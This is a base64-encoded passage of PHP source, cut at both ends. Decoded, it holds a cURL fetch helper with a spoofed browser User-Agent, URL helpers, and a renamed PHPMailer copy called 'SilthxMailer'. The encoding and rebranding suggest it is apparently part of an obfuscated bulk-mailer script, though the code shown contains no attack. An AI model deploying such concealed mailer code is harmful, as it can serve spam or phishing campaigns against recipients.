kVUIENMUiAxLjEuNDMyMikiKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCAxNSk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0VOQ09ESU5HLCAnZ3ppcCwgZGVmbGF0ZScpOw0KICAgICRoZWFkZXJzICAgPSBhcnJheSgpOw0KICAgICRoZWFkZXJzW10gPSAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjo0NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQ1LjAiOw0KICAgICRoZWFkZXJzW10gPSAiQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgiOw0KICAgICRoZWFkZXJzW10gPSAiQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNSI7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsICRoZWFkZXJzKTsNCiAgICAkcGFnZSAgICAgPSBjdXJsX2V4ZWMoJGNoKTsNCiAgICAkaHR0cGNvZGUgPSBjdXJsX2dldGluZm8oJGNoLCBDVVJMSU5GT19IVFRQX0NPREUpOw0KICAgIGlmKCgkaHR0cGNvZGUgPj0gNTAwICYmICRodHRwY29kZSA8IDYwMCkgb3IgKCRodHRwY29kZSA+PSA0MDAgJiYgJGh0dHBjb2RlIDwgNTAwKSkgeyByZXR1cm4gIlJFTU9URV9FUlJPUl8iLiRodHRwY29kZS4iX0NVUkx8IiAuICR1cmw7IH0NCg0KICAgIGlmIChjdXJsX2Vycm5vKCRjaCkpIHsNCiAgICAgICAgcmV0dXJuICJSRU1PVEVfQ1VSTF9FUlJOT3wiIC4gY3VybF9lcnJvcigkY2gpOw0KICAgIH0NCiAgICBjdXJsX2Nsb3NlKCRjaCk7DQogICAgcmV0dXJuICRwYWdlOw0KfQ0KZnVuY3Rpb24gR2V0UGFnZUNvbnRlbnQoJHVybCwgJHBvc3RGaWVsZHMgPSBudWxsKSB7DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpIHsNCiAgICAgICAgcmV0dXJuIGNVUkxSZXF1ZXN0KCR1cmwsICRwb3N0RmllbGRzKTsNCiAgICB9IGVsc2VpZiAoIWZ1bmN0aW9uX2V4aXN0cygnZmlsZV9nZXRfY29udGVudHMnKSkgew0KICAgICAgICByZXR1cm4gJ2ZpbGVfZ2V0X2NvbnRlbnRzIG5vdCBhdmFpbGFibGUgISc7DQogICAgfSBlbHNlIHsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRwb3N0RmllbGRzKSkgew0KICAgICAgICAgICAgJHBvc3RkYXRhID0gaHR0cF9idWlsZF9xdWVyeSgkcG9zdEZpZWxkcyk7DQogICAgICAgICAgICAkb3B0cyAgICAgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAnaHR0cCcgPT4gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywNCiAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICRwb3N0ZGF0YQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICAkY29udGV4dCAgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOw0KICAgICAgICAgICAgJHJlc3VsdCAgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7DQogICAgICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQogICAgICAgIH0NCiAgICB9DQp9DQpmdW5jdGlvbiB1cmxfb3JpZ2luKCRzLCAkdXNlX2ZvcndhcmRlZF9ob3N0ID0gZmFsc2UpIHsNCiAgICAkc3NsICAgICAgPSAoIWVtcHR5KCRzWydIVFRQUyddKSAmJiAkc1snSFRUUFMnXSA9PSAnb24nKTsNCiAgICAkc3AgICAgICAgPSBzdHJ0b2xvd2VyKCRzWydTRVJWRVJfUFJPVE9DT0wnXSk7DQogICAgJHByb3RvY29sID0gc3Vic3RyKCRzcCwgMCwgc3RycG9zKCRzcCwgJy8nKSkgLiAoKCRzc2wpID8gJ3MnIDogJycpOw0KICAgICRwb3J0ICAgICA9ICRzWydTRVJWRVJfUE9SVCddOw0KICAgICRwb3J0ICAgICA9ICgoISRzc2wgJiYgJHBvcnQgPT0gJzgwJykgfHwgKCRzc2wgJiYgJHBvcnQgPT0gJzQ0MycpKSA/ICcnIDogJzonIC4gJHBvcnQ7DQogICAgJGhvc3QgICAgID0gKCR1c2VfZm9yd2FyZGVkX2hvc3QgJiYgaXNzZXQoJHNbJ0hUVFBfWF9GT1JXQVJERURfSE9TVCddKSkgPyAkc1snSFRUUF9YX0ZPUldBUkRFRF9IT1NUJ10gOiAoaXNzZXQoJHNbJ0hUVFBfSE9TVCddKSA/ICRzWydIVFRQX0hPU1QnXSA6IG51bGwpOw0KICAgICRob3N0ICAgICA9IGlzc2V0KCRob3N0KSA/ICRob3N0IDogJHNbJ1NFUlZFUl9OQU1FJ10gLiAkcG9ydDsNCiAgICByZXR1cm4gJHByb3RvY29sIC4gJzovLycgLiAkaG9zdDsNCn0NCmZ1bmN0aW9uIGZ1bGxfdXJsKCRzLCAkdXNlX2ZvcndhcmRlZF9ob3N0ID0gZmFsc2UpIHsNCiAgICAkVVJJID0gZXhwbG9kZSgnPycsICRzWydSRVFVRVNUX1VSSSddKTsNCiAgICByZXR1cm4gdXJsX29yaWdpbigkcywgJHVzZV9mb3J3YXJkZWRfaG9zdCkgLiAkVVJJWzBdOw0KfQ0KY2xhc3MgU2lsdGh4TWFpbGVyIHsNCiAgICBwdWJsaWMgJFByaW9yaXR5ID0gbnVsbDsNCiAgICBwdWJsaWMgJENoYXJTZXQgPSAnaXNvLTg4NTktMSc7DQogICAgcHVibGljICRDb250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsNCiAgICBwdWJsaWMgJEVuY29kaW5nID0gJzhiaXQnOw0KICAgIHB1YmxpYyAkRXJyb3JJbmZvID0gJyc7DQogICAgcHVibGljICRGcm9tID0gJ3Jvb3RAbG9jYWxob3N0JzsNCiAgICBwdWJsaWMgJEZyb21OYW1lID0gJ1Jvb3QgVXNlcic7DQogICAgcHVibGljICRTZW5kZXIgPSAnJzsNCiAgICBwdWJsaWMgJFJldHVyblBhdGggPSAnJzsNCiAgICBwdWJsaWMgJFN1YmplY3QgPSAnJzsNCiAgICBwdWJsaWMgJEJvZHkgPSAnJzsNCiAgICBwdWJsaWMgJEFsdEJvZHkgPSAnJzsNCiAgICBwdWJsaWMgJEljYWwgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJE1JTUVCb2R5ID0gJyc7DQogICAgcHJvdGVjdGVkICRNSU1FSGVhZGVyID0gJyc7DQogICAgcHJvdGVjdGVkICRtYWlsSGVhZGVyID0gJyc7DQogICAgcHVibGljICRXb3JkV3JhcCA9IDA7DQogICAgcHVibGljICRNYWlsZXIgPSAnbWFpbCc7DQogICAgcHVibGljICRTZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOw0KICAgIHB1YmxpYyAkVXNlU2VuZG1haWxPcHRpb25zID0gdHJ1ZTsNCiAgICBwdWJsaWMgJFBsdWdpbkRpciA9ICcnOw0KICAgIHB1YmxpYyAkQ29uZmlybVJlYWRpbmdUbyA9ICcnOw0KICAgIHB1YmxpYyAkSG9zdG5hbWUgPSAnJzsNCiAgICBwdWJsaWMgJE1lc3NhZ2VJRCA9ICcnOw0KICAgIHB1YmxpYyAkTWVzc2FnZURhdGUgPSAnJzsNCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsNCiAgICBwdWJsaWMgJFBvcnQgPSAyNTsNCiAgICBwdWJsaWMgJEhlbG8gPSAnJzsNCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsNCiAgICBwdWJsaWMgJFVzZVNvY2tzID0gZmFsc2U7DQogICAgcHVibGljICRTb2Nrc0hvc3QgPSBudWxsOw0KICAgIHB1YmxpYyAkU29ja3NQb3J0ID0gMDsNCiAgICBwdWJsaWMgJFNNVFBBdXRvVExTID0gdHJ1ZTsNCiAgICBwdWJsaWMgJFNNVFBBdXRoID0gZmFsc2U7DQogICAgcHVibGljICRTTVRQT3B0aW9ucyA9IGFycmF5KCk7DQogICAgcHVibGljICRVc2VybmFtZSA9ICcnOw0KICAgIHB1YmxpYyAkUGFzc3dvcmQgPSAnJzsNCiAgICBwdWJsaWMgJEF1dGhUeXBlID0gJyc7DQogICAgcHVibGljICRSZWFsbSA9ICcnOw0KICAgIHB1YmxpYyAkV29ya3N0YXRpb24gPSAnJzsNCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAxMDsNCiAgICBwdWJsaWMgJFNNVFBEZWJ1ZyA9IDA7DQogICAgcHVibGljICREZWJ1Z291dHB1dCA9ICdlY2hvJzsNCiAgICBwdWJsaWMgJFNNVFBLZWVwQWxpdmUgPSBmYWxzZTsNCiAgICBwdWJsaWMgJFNpbmdsZVRvID0gZmFsc2U7DQogICAgcHVibGljICRTaW5nbGVUb0FycmF5ID0gYXJyYXkoKTsNCiAgICBwdWJsaWMgJGRvX3ZlcnAgPSBmYWxzZTsNCiAgICBwdWJsaWMgJEFsbG93RW1wdHkgPSBmYWxzZTsNCiAgICBwdWJsaWMgJExFID0gIlxuIjsNCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsNCiAgICBwdWJsaWMgJERLSU1faWRlbnRpdHkgPSAnJzsNCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOw0KICAgIHB1YmxpYyAkREtJTV9kb21haW4gPSAnJzsNCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZSA9ICcnOw0KICAgIHB1YmxpYyAkREtJTV9wcml2YXRlX3N0cmluZyA9ICcnOw0KICAgIHB1YmxpYyAkYWN0aW9uX2Z1bmN0aW9uID0gJyc7DQogICAgcHVibGljICRYTWFpbGVyID0gJyc7DQogICAgcHVibGljIHN0YXRpYyAkdmFsaWRhdG9yID0gJ2F1dG8nOw0KICAgIHByb3RlY3RlZCAkc210cCA9IG51bGw7DQogICAgcHJvdGVjdGVkICR0byA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRjYyA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRiY2MgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkUmVwbHlUbyA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRhbGxfcmVjaXBpZW50cyA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRSZWNpcGllbnRzUXVldWUgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkUmVwbHlUb1F1ZXVlID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGF0dGFjaG1lbnQgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkQ3VzdG9tSGVhZGVyID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGxhc3RNZXNzYWdlSUQgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJG1lc3NhZ2VfdHlwZSA9ICcnOw0KICAgIHByb3RlY3RlZCAkYm91bmRhcnkgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkbGFuZ3VhZ2UgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOw0KICAgIHByb3RlY3RlZCAkc2lnbl9jZXJ0X2ZpbGUgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJHNpZ25fa2V5X2ZpbGUgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7DQogICAgcHJvdGVjdGVkICRzaWduX2tleV9wYXNzID0gJyc7DQogICAgcHJvdGVjdGVkICRleGNlcHRpb25zID0gZmFsc2U7DQogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOw0KICAgIGNvbnN0IFNUT1BfTUVTU0FHRSA9IDA7DQogICAgY29uc3QgU1RPUF9DT05USU5VRSA9IDE7DQogICAgY29uc3QgU1RPUF9DUklUSUNBTCA9IDI7DQogICAgY29uc3QgQ1JMRiA9ICJcclxuIjsNCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRleGNlcHRpb25zID0gbnVsbCkgew0KICAgICAgICBpZiAoJGV4Y2VwdGlvbnMgIT09IG51bGwpIHsNCiAgICAgICAgICAgICR0aGlzLT5leGNlcHRpb25zID0gKGJvb2xlYW4pICRleGNlcHRpb25zOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCkgew0KICAgICAgICAkdGhpcy0+c210cENsb3NlKCk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gbWFpbFBhc3N0aHJ1KCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKSB7DQogICAgICAgIGlmIChpbmlfZ2V0KCdtYnN0cmluZy5mdW5jX292ZXJsb2FkJykgJiAxKSB7DQogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5zZWN1cmVIZWFkZXIoJHN1YmplY3QpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHN1YmplY3QpKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaW5pX2dldCgnc2FmZV9tb2RlJykgb3IgISR0aGlzLT5Vc2VTZW5kbWFpbE9wdGlvbnMgb3IgaXNfbnVsbCgkcGFyYW1zKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlZGVidWcoJHN0cikgew0KICAgICAgICBpZiAoJHRoaXMtPlNNVFBEZWJ1ZyA8PSAwKSB7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIGFycmF5KA0KICAgICAgICAgICAgJ2Vycm9yX2xvZycsDQogICAgICAgICAgICAnaHRtbCcsDQogICAgICAgICAgICAnZWNobycNCiAgICAgICAgKSkgYW5kIGlzX2NhbGxhYmxlKCR0aGlzLT5EZWJ1Z291dHB1dCkpIHsNCiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5EZWJ1Z291dHB1dCwgJHN0ciwgJHRoaXMtPlNNVFBEZWJ1Zyk7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkdGhpcy0+RGVidWdvdXRwdXQpIHsNCiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6DQogICAgICAgICAgICAgICAgZXJyb3JfbG9nKCRzdHIpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnaHRtbCc6DQogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJHN0ciksIEVOVF9RVU9URVMsICdVVEYtOCcpIC4gIjxicj5cbiI7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdlY2hvJzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnL1xyXG4/L21zJywgIlxuIiwgJHN0cik7DQogICAgICAgICAgICAgICAgZWNobyBnbWRhdGUoJ1ktbS1kIEg6aTpzJykgLiAiXHQiIC4gc3RyX3JlcGxhY2UoIlxuIiwgIlxuICAgICAgICAgICAgICAgICAgIFx0ICAgICAgICAgICAgICAgICAgIiwgdHJpbSgkc3RyKSkgLiAiXG4iOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0hUTUwoJGlzSHRtbCA9IHRydWUpIHsNCiAgICAgICAgaWYgKCRpc0h0bWwpIHsNCiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L2h0bWwnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvcGxhaW4nOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NNVFAoKSB7DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc210cCc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc01haWwoKSB7DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnbWFpbCc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NlbmRtYWlsKCkgew0KICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7DQogICAgICAgIGlmICghc3RyaXN0cigkaW5pX3NlbmRtYWlsX3BhdGgsICdzZW5kbWFpbCcpKSB7DQogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICRpbmlfc2VuZG1haWxfcGF0aDsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3NlbmRtYWlsJzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzUW1haWwoKSB7DQogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsNCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsNCiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdmFyL3FtYWlsL2Jpbi9xbWFpbC1pbmplY3QnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAncW1haWwnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQWRkcmVzcygkYWRkcmVzcywgJG5hbWUgPSAnJykgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygndG8nLCAkYWRkcmVzcywgJG5hbWUpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ0MoJGFkZHJlc3MsICRuYW1lID0gJycpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ2NjJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEJDQygkYWRkcmVzcywgJG5hbWUgPSAnJykgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnYmNjJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZFJlcGx5VG8oJGFkZHJlc3MsICRuYW1lID0gJycpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ1JlcGx5LVRvJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZE9yRW5xdWV1ZUFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lKSB7DQogICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7DQogICAgICAgICRuYW1lICAgID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOw0KICAgICAgICBpZiAoKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJHBhcmFtcyA9IGFycmF5KA0KICAgICAgICAgICAgJGtpbmQsDQogICAgICAgICAgICAkYWRkcmVzcywNCiAgICAgICAgICAgICRuYW1lDQogICAgICAgICk7DQogICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9zKSkgYW5kICR0aGlzLT5pZG5TdXBwb3J0ZWQoKSkgew0KICAgICAgICAgICAgaWYgKCRraW5kICE9ICdSZXBseS1UbycpIHsNCiAgICAgICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZWNpcGllbnRzUXVldWUpKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWVbJGFkZHJlc3NdID0gJHBhcmFtczsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZXBseVRvUXVldWUpKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZXBseVRvUXVldWVbJGFkZHJlc3NdID0gJHBhcmFtczsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgNCiAgICAgICAgICAgICR0aGlzLA0KICAgICAgICAgICAgJ2FkZEFuQWRkcmVzcycNCiAgICAgICAgKSwgJHBhcmFtcyk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7DQogICAgICAgIGlmICghaW5fYXJyYXkoJGtpbmQsIGFycmF5KA0KICAgICAgICAgICAgJ3RvJywNCiAgICAgICAgICAgICdjYycsDQogICAgICAgICAgICAnYmNjJywNCiAgICAgICAgICAgICdSZXBseS1UbycNCiAgICAgICAgKSkpIHsNCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ0ludmFsaWQgcmVjaXBpZW50IGtpbmQ6ICcpIC4gJGtpbmQ7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7DQogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKGFkZEFuQWRkcmVzcyAka2luZCk6ICRhZGRyZXNzIjsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICgka2luZCAhPSAnUmVwbHktVG8nKSB7DQogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5hbGxfcmVjaXBpZW50cykpIHsNCiAgICAgICAgICAgICAgICBhcnJheV9wdXNoKCR0aGlzLT4ka2luZCwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzLA0KICAgICAgICAgICAgICAgICAgICAkbmFtZQ0KICAgICAgICAgICAgICAgICkpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSB0cnVlOw0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGFkZHJlc3MpLCAkdGhpcy0+UmVwbHlUbykpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MsDQogICAgICAgICAgICAgICAgICAgICRuYW1lDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBwYXJzZUFkZHJlc3NlcygkYWRkcnN0ciwgJHVzZWltYXAgPSB0cnVlKSB7DQogICAgICAgICRhZGRyZXNzZXMgPSBhcnJheSgpOw0KICAgICAgICBpZiAoJHVzZWltYXAgYW5kIGZ1bmN0aW9uX2V4aXN0cygnaW1hcF9yZmM4MjJfcGFyc2VfYWRybGlzdCcpKSB7DQogICAgICAgICAgICAkbGlzdCA9IGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QoJGFkZHJzdHIsICcnKTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRsaXN0IGFzICRhZGRyZXNzKSB7DQogICAgICAgICAgICAgICAgaWYgKCRhZGRyZXNzLT5ob3N0ICE9ICcuU1lOVEFYLUVSUk9SLicpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAocHJvcGVydHlfZXhpc3RzKCRhZGRyZXNzLCAncGVyc29uYWwnKSA/ICRhZGRyZXNzLT5wZXJzb25hbCA6ICcnKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdA0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgI